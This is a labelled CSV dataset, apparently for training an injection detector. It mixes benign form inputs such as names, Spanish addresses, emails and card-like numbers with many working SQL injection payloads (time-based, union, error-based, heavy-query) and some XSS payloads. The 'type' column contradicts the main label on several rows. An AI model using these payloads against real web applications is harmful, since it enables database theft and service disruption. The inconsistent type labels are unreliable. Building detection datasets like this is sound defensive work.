Text,attack_type,Label,type
oreste,norm,0,normal
"muelle evaristo churruca, 149 5?e",norm,0,normal
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1,sql
"-4586') as shdb where 6176=6176 union all select 6176,6176,6176,6176#",sqli,1,sql
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('zovb' like 'zovb",sqli,1,normal
7500539436342438,norm,0,normal
als pinart,norm,0,normal
1289184005344933,norm,0,normal
dannunzio.sugiura@ilusionarium.sj,norm,0,normal
macedonia 48,norm,0,normal
harris,norm,0,normal
"1'||(select 'baur' from dual where 9384=9384 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
brenden,norm,0,normal
villaornate y castro,norm,0,normal
asacadora,norm,0,normal
marye@theroxyblue.mr,norm,0,normal
c/ david 169 6-h,norm,0,normal
xifr,norm,0,normal
-6661')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('tbmu' like 'tbmu,sqli,1,sql
27860,norm,0,normal
"1 union all select null,null,null,null,null,null#",sqli,1,sql
"1"" or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1%"") and 2006=2006",sqli,1,normal
"1'+(select bptu where 7356=7356 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",sqli,1,sql
"1) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
chaucon caban,norm,0,normal
"1)) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
1') where 2974=2974 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
"1) as iuje where 1976=1976 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
delmore,norm,0,normal
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'ytlf'='ytlf",sqli,1,sql
"1%""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""",sqli,1,sql
karlweiss@barnicesuv.gov,norm,0,normal
1' where 9583=9583 and 5319=7670#,sqli,1,normal
1') where 5680=5680 and (3020=3020)*6703--,sqli,1,sql
4916,norm,0,normal
1'||(select 'aioq' from dual where 8176=8176;begin user_lock.sleep(5); end--,sqli,1,sql
juan cruz,norm,0,normal
avda. general elizaicin 64 5-d,norm,0,normal
63269334z,norm,0,normal
47882,norm,0,normal
bollard@viajesdacapalla.ch,norm,0,normal
"1))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
brana,norm,0,normal
ros,norm,0,normal
calle rioja 147,norm,0,normal
adelia,norm,0,normal
bould_rhue2@palomajimenez.ru,norm,0,normal
"1';select benchmark(5000000,md5(0x4c4d6142))",sqli,1,sql
1';waitfor delay '0:0:5' and 'dfzn'='dfzn,sqli,1,sql
14930,norm,0,normal
lacruz morey,norm,0,normal
plaa caudillo 60,norm,0,normal
"-6996%"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
16707,norm,0,normal
1esa0o401m0en7o,norm,0,normal
50269,norm,0,normal
"-3971%'))) or elt(1032=1032,3623) and ((('%'='",sqli,1,normal
nahiara,norm,0,normal
"1') where 3703=3703 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
42218,norm,0,normal
"1'||(select 'adoe' from dual where 7662=7662;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'",sqli,1,sql
"c/ cadiz, 161 8?c",norm,0,normal
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('oxvd' like 'oxvd",sqli,1,sql
09665,norm,0,normal
osburn,norm,0,normal
42127,norm,0,normal
"-3790"") as ojgb where 5925=5925 union all select 5925,5925#",sqli,1,sql
lorenson-tordi@youtubeanunciox.fk,norm,0,normal
64462042b,norm,0,normal
7m63e31r,norm,0,normal
cabrer gascon,norm,0,normal
70385522w,norm,0,normal
"arco del meson, 47,",norm,0,normal
sollana,norm,0,normal
3317651896955813,norm,0,normal
yuste,norm,0,normal
somisett,norm,0,normal
1%')) rlike (select * from (select(sleep(5)))sgvo) and (('%'=',sqli,1,sql
-7037')) as epsg where 3684=3684 union all select 3684--,sqli,1,sql
catll,norm,0,normal
hays_adiarte@lingotes.com.je,norm,0,normal
mercantesca,norm,0,normal
"<meta http-equiv=""link"" content=""<javascript:alert('xss')>; rel=stylesheet"">",xss,2,xss
"1%' union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
vahid,norm,0,normal
clever,norm,0,normal
8169,norm,0,normal
debever@viajesparamujeres.es,norm,0,normal
"1"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
fuentes claras,norm,0,normal
och*avero,norm,0,normal
40170,norm,0,normal
pepe.whitehead@jaxiaabogadosyeconomistas.nr,norm,0,normal
51734480m,norm,0,normal
c/ javea 57,norm,0,normal
arraia-maeztu,norm,0,normal
"c/ joaquin guichot, 10",norm,0,normal
"1%""))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
calle rioguadalimar 183 1?e,norm,0,normal
1 where 8095=8095;select (case when (5152=7853) then 5152 else 5152*(select 5152 from mysql.db) end)#,sqli,1,sql
bellaguarda,norm,0,normal
"1'||(select 'rask' from dual where 9411=9411 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'",sqli,1,sql
380lea,norm,0,normal
daisey,norm,0,normal
"1') where 9226=9226 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
18914400m,norm,0,normal
03827,norm,0,normal
-1011 or 7140=9977--,sqli,1,sql
garrulera,norm,0,normal
1'+(select 'czpg' where 6627=6627 and 2006=2006,sqli,1,sql
"1' where 9420=9420 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
1%'))) and 7219=7361 and ((('%'=',sqli,1,normal
1' in boolean mode) and 9198=9198--,sqli,1,sql
4259,norm,0,normal
-7548 or 2850=9666,sqli,1,normal
mercado 188,norm,0,normal
25300,norm,0,normal
1'));select sleep(5)#,sqli,1,sql
6317858667918423,norm,0,normal
"1""))) and elt(2421=9612,9612) and (((""gbdx"" like ""gbdx",sqli,1,normal
1581122247417335,norm,0,normal
06160,norm,0,normal
31172,norm,0,normal
valcourt,norm,0,normal
bolvir,norm,0,normal
1') as xbsc where 6772=6772;waitfor delay '0:0:5'--,sqli,1,sql
15317,norm,0,normal
boyar-decamp@barnizultravioleta.as,norm,0,normal
"c/ antonio oliver s/n, 4?h",norm,0,normal
"1"")) as yosd where 1255=1255;begin user_lock.sleep(5); end--",sqli,1,sql
jetazo,norm,0,normal
27837,norm,0,normal
oliver,norm,0,normal
etreros 8 13a,norm,0,normal
20120,norm,0,normal
-2573)) order by 1#,sqli,1,normal
1914,norm,0,normal
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('iqvg'='iqvg",sqli,1,sql
1%'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
lopiano,norm,0,normal
junette6,norm,0,normal
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('yhku' like 'yhku,sqli,1,sql
cardiel de los montes,norm,0,normal
3900278592647415,norm,0,normal
halim,norm,0,normal
"1',extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",sqli,1,sql
almacelles,norm,0,normal
47620,norm,0,normal
"-7797'+(select oulr where 7091=7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",sqli,1,sql
wayca,norm,0,normal
"1%"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""=""",sqli,1,sql
"1"";select pg_sleep(5)--",sqli,1,sql
47110,norm,0,normal
eusquero,norm,0,normal
campillo,norm,0,normal
off,norm,0,normal
aldealengua de pedraza,norm,0,normal
anda matamalas,norm,0,normal
nimia,norm,0,normal
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,1,sql
tivissa,norm,0,normal
-7369 or 9323=9323#,sqli,1,normal
inda,norm,0,normal
jorquera,norm,0,normal
kripan,norm,0,normal
"1%"" waitfor delay '0:0:5'--",sqli,1,sql
ryszard,norm,0,normal
-1<<script>document.cookie=true;</script>,xss,2,xss
1))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((6062=6062,sqli,1,sql
1') where 6622=6622 order by 1--,sqli,1,sql
"1'+(select 'qmtx' where 6992=6992 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1"") where 5129=5129 order by 1--",sqli,1,sql
69320452q,norm,0,normal
c/ cristobal quintero 86,norm,0,normal
94318165h,norm,0,normal
1%')));select (case when (5752=6036) then 1 else 5752*(select 5752 from master..sysdatabases) end)--,sqli,1,sql
tapinga,norm,0,normal
0582956368100582,norm,0,normal
manzano babot,norm,0,normal
2ariosamente,norm,0,normal
"1' where 8864=8864;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((4510=4510",sqli,1,sql
b44tiste$rio,norm,0,normal
"1')) as cgey where 2130=2130 and make_set(7914=4032,4032)--",sqli,1,sql
"calle sierra del quintanar, 199 9-b",norm,0,normal
22134277c,norm,0,normal
"<div style=""behaviour: url([link to code]);"">",xss,2,sql
ceccarelli urp,norm,0,normal
-3059') as jhbh where 4056=4056 or (3498=6965)*6965--,sqli,1,sql
"-2899"")) as uyoc where 8417=8417 union all select 8417,8417,8417,8417--",sqli,1,sql
nalec,norm,0,normal
-8292%') or 8571=8571--,sqli,1,sql
50561,norm,0,normal
t16564l,norm,0,normal
01246496b,norm,0,normal
2754013363983769,norm,0,normal
"1') union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
guerrino,norm,0,normal
99997973e,norm,0,normal
oshea_knowles@tiaherminia.gh,norm,0,normal
1)) rlike (select (case when (6113=1222) then 1 else 0x28 end)) and ((2815=2815,sqli,1,sql
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",sqli,1,sql
coyne-rabasa@intercambioenlaces.do,norm,0,normal
gail,norm,0,normal
atufamiento,norm,0,normal
gavin@apagado.com.pk,norm,0,normal
"1%"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""",sqli,1,sql
"1"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""mlld"" like ""mlld",sqli,1,sql
a2152,norm,0,normal
r8mio34,norm,0,normal
17469,norm,0,normal
-5708 where 3134=3134 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
twist.dangerfield@beltoan.com.ne,norm,0,normal
san miguel de abona,norm,0,normal
litherla,norm,0,normal
"1') where 9454=9454 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"c/ salvador dali, 106,",norm,0,normal
utilitarismo,norm,0,normal
"josep pallch i carola, 199, 4-e",norm,0,normal
"c/ padre ignacio ellaguria, 117 6-e",norm,0,normal
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ozef'='ozef",sqli,1,normal
1) as ryks where 1196=1196;select (case when (1005=5996) then 1 else 1005*(select 1005 from master..sysdatabases) end)--,sqli,1,sql
guy,norm,0,normal
zurbarn benedi,norm,0,normal
vino rioja,norm,0,normal
a92974d4r,norm,0,normal
josias,norm,0,normal
1)));select (case when (4636=1108) then 1 else 4636*(select 4636 from master..sysdatabases) end)--,sqli,1,sql
twiggy@ladigianni.vc,norm,0,normal
"c/ gravina, s/n",norm,0,normal
perseidas,norm,0,normal
"-4031""))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""auhn""=""auhn",sqli,1,sql
"calle barrio cura-vigo vello, 134 10?d",norm,0,normal
3422,norm,0,normal
<iframe id=xss / /onload=alert(/xss/)></iframe>,xss,2,xss
shupe,norm,0,normal
"-6778) as xutm where 6442=6442 union all select 6442,6442,6442,6442,6442,6442#",sqli,1,sql
chavez jofre,norm,0,normal
1%')));select pg_sleep(5) and ((('%'=',sqli,1,sql
"1')) or elt(6272=6272,sleep(5)) and (('cwjd'='cwjd",sqli,1,normal
-6855') or 8519=9248,sqli,1,normal
1')) rlike sleep(5) and (('qitl' like 'qitl,sqli,1,normal
7uo09e5a1,norm,0,normal
-1036') or 6872=6872 and ('wvbi'='wvbi,sqli,1,normal
-7971' union all select 4273#,sqli,1,sql
floriana,norm,0,normal
"1%"")) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"-8988"")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""dyxh"" like ""dyxh",sqli,1,sql
"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"calle limones, 60,",norm,0,normal
"1'+(select dklk where 9862=9862 union all select null,null,null,null,null,null--",sqli,1,sql
rossanes,norm,0,normal
9120,norm,0,normal
75582707s,norm,0,normal
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('crus'='crus",sqli,1,sql
rocco-misaki@soybueno.nz,norm,0,normal
palacio@eldeseodepecar.kn,norm,0,normal
behetra,norm,0,normal
1') as ghvi where 3880=3880 and 4595=4595#,sqli,1,normal
7788447750909389,norm,0,normal
34126,norm,0,normal
1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--,sqli,1,sql
salvi figuls,norm,0,normal
zlotnick,norm,0,normal
kirland-lincovsky@la-sexta-f1.fo,norm,0,normal
rains8,norm,0,normal
c/ francisco rodriguez 48,norm,0,normal
causa,norm,0,normal
78153384m,norm,0,normal
25684857k,norm,0,normal
"-3697'))) union all select 5180,5180,5180,5180,5180,5180,5180--",sqli,1,sql
langlois_benavente@sutelefono.mg,norm,0,normal
4092441841924319,norm,0,normal
6473313024443547,norm,0,normal
-1</title><script>document.cookie=true;</script>,xss,2,xss
olas del rey,norm,0,normal
"1') as tuhc where 4018=4018 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
gillespie@deuxmanagement.web,norm,0,normal
duran manero,norm,0,normal
61z,norm,0,normal
goggin,norm,0,normal
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('jicq' like 'jicq",sqli,1,sql
45100,norm,0,normal
maritza5,norm,0,normal
"pintanos, los",norm,0,normal
"1"")) as gqxk where 9199=9199 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
"1"") as vpna where 5450=5450 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
19192,norm,0,normal
torrande gaitan,norm,0,normal
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""vabm""=""vabm",sqli,1,sql
"paraje antonio de nebrija 39,",norm,0,normal
17151,norm,0,normal
"1)) or 8466=benchmark(5000000,md5(0x694a4745)) and ((8189=8189",sqli,1,normal
1') where 1424=1424 and sleep(5)--,sqli,1,sql
rahmani,norm,0,normal
jemie,norm,0,normal
dcada,norm,0,normal
1ob20h9la3,norm,0,normal
978,norm,0,normal
"1%')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('%'='",sqli,1,sql
83497200r,norm,0,normal
"<iframe id=xss src=""javascript:alert('xss'); <",xss,2,xss
"1) as rbmn where 5948=5948 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
noguerol,norm,0,normal
86475524d,norm,0,normal
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""ghdr"" like ""ghdr",sqli,1,sql
bluethne,norm,0,normal
"1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--",sqli,1,sql
shiomi@errebebe.ug,norm,0,normal
enfardeladora,norm,0,normal
"1 where 3799=3799 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
lenihan.asanachinda@hojainformativas.cf,norm,0,normal
"1%"" or sleep(5)#",sqli,1,normal
rahman,norm,0,normal
"-1<base href=""javascript:document.cookie=true;//"">",xss,2,xss
lax@g-audi.nu,norm,0,normal
"1%""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""%""=""",sqli,1,sql
04479,norm,0,normal
shashi,norm,0,normal
"-2625') or elt(1032=1032,3623) and ('eliy'='eliy",sqli,1,normal
14240,norm,0,normal
burgs campa,norm,0,normal
"c/ la paloma, 32 12-a",norm,0,normal
cretas,norm,0,normal
maials,norm,0,normal
"-1988 where 4597=4597 union all select 4597,4597,4597,4597,4597,4597--",sqli,1,sql
2935,norm,0,normal
"1"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""hbfr"" like ""hbfr",sqli,1,sql
aldehuela de yeltes,norm,0,normal
08806627l,norm,0,normal
0,norm,0,normal
rolanda,norm,0,normal
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",sqli,1,sql
"<div id=xss style=""background-image: url(javascript:alert('xss'))"">",xss,2,xss
"1%') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
thiessen,norm,0,normal
dean,norm,0,normal
lovegrov,norm,0,normal
"1"") where 5794=5794 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
ritz@hipergipuzkoa.pa,norm,0,normal
"calle playa del carmen, 178, 2?d",norm,0,normal
weld@yiutuve.vc,norm,0,normal
puigveh morande,norm,0,normal
"c/ pista, 101",norm,0,normal
"1"";(select * from (select(sleep(5)))srmq)",sqli,1,sql
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'rfgj' like 'rfgj",sqli,1,sql
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kird'='kird",sqli,1,sql
70471887w,norm,0,normal
marcelin solivera,norm,0,normal
"-5160') union all select 8067,8067,8067,8067,8067,8067,8067--",sqli,1,sql
harshad,norm,0,normal
15314533y,norm,0,normal
cinda,norm,0,normal
31096,norm,0,normal
"calle roger de lauria, 4",norm,0,normal
4433404461148186,norm,0,normal
1)) or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
96457070s,norm,0,normal
"1 where 6383=6383 or elt(6272=6272,sleep(5))--",sqli,1,sql
urrutia delems,norm,0,normal
5048106105397665,norm,0,normal
63,norm,0,normal
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
86943454g,norm,0,normal
0957098737909112,norm,0,normal
novisedl9,norm,0,normal
"1'||(select 'bgdh' from dual where 1967=1967;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"-1030"" where 2161=2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",sqli,1,sql
"1')) as uuuk where 7234=7234 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
"1%' and elt(1210=1210,sleep(5)) and '%'='",sqli,1,normal
6796,norm,0,normal
remax ondetti,norm,0,normal
ditte pallars,norm,0,normal
"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('ymad' like 'ymad",sqli,1,sql
"1"" where 3484=3484 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
elysia,norm,0,normal
6442,norm,0,normal
marracos,norm,0,normal
wilmer@dubi.as,norm,0,normal
en9r195d9,norm,0,normal
"-3729')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('czed'='czed",sqli,1,sql
"1"") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
braham,norm,0,normal
pardip,norm,0,normal
1%')) waitfor delay '0:0:5' and (('%'=',sqli,1,normal
"<body id=xss onscroll=eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",xss,2,normal
79p2lis25,norm,0,normal
"1"" where 1100=1100;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1%"";select sleep(5) and ""%""=""",sqli,1,sql
vadi,norm,0,normal
0614375180233873,norm,0,normal
"1"" rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ""tbbk"" like ""tbbk",sqli,1,sql
"-8205' or elt(6581=3480,3480) and 'sosv'='sosv",sqli,1,normal
"1"" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
81887613t,norm,0,normal
"1',updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)",sqli,1,sql
"1"") as firv where 4522=4522 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
navarredonda de la rinconada,norm,0,normal
f8av2,norm,0,normal
-1769 union all select 6054--,sqli,1,sql
"1%' union all select null,null,null,null,null,null,null--",sqli,1,sql
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
46841,norm,0,normal
"-2319 union all select 5068,5068,5068#",sqli,1,sql
campion@transportesvegasl.cat,norm,0,normal
fiscal,norm,0,normal
"1')) union all select null,null,null,null,null,null,null--",sqli,1,sql
thurston,norm,0,normal
alpanseque,norm,0,normal
a65esad0,norm,0,normal
"1%"")) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
aznar,norm,0,normal
5668,norm,0,normal
1%';select (case when (1407=2741) then 1407 else 1407*(select 1407 from mysql.db) end)#,sqli,1,sql
"plaza del yunque, 4,",norm,0,normal
fisicoqumico,norm,0,normal
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""vlev"" like ""vlev",sqli,1,sql
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq",sqli,1,sql
"1') where 1804=1804 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"-8636""))) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",sqli,1,sql
">""<iframe src=""javascript:document.cookie=true;>",xss,2,xss
santa fe de mondjar,norm,0,normal
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('cxjp'='cxjp",sqli,1,sql
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"<object classid=clsid:..."" codebase=""javascript:alert('xss');"">",xss,2,xss
6asi3ar2o,norm,0,normal
25137442y,norm,0,normal
"1"") as hymr where 5497=5497 union all select null,null,null,null--",sqli,1,sql
"-2289"") or 8624=6279 and (""ised""=""ised",sqli,1,normal
-9100) or 8792=9550--,sqli,1,sql
96,norm,0,normal
12466,norm,0,normal
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='",sqli,1,sql
legros@muchapolicia.tw,norm,0,normal
soffia,norm,0,normal
31281,norm,0,normal
<? echo('<scr)';,xss,2,sql
cuartn,norm,0,normal
viataiano,norm,0,normal
1'));select sleep(5) and (('keoy'='keoy,sqli,1,sql
-9212 or 1026=7967#,sqli,1,normal
"1)) as ambt where 5198=5198 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
"1%"");begin dbms_lock.sleep(5); end and (""%""=""",sqli,1,sql
7810892855835467,norm,0,normal
macgregor_poomjai@a2hotels.bj,norm,0,normal
apo4l936ca,norm,0,normal
1))) waitfor delay '0:0:5'--,sqli,1,sql
1');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
32633,norm,0,normal
burness,norm,0,normal
1'))) and 5615=5458--,sqli,1,sql
15657148j,norm,0,normal
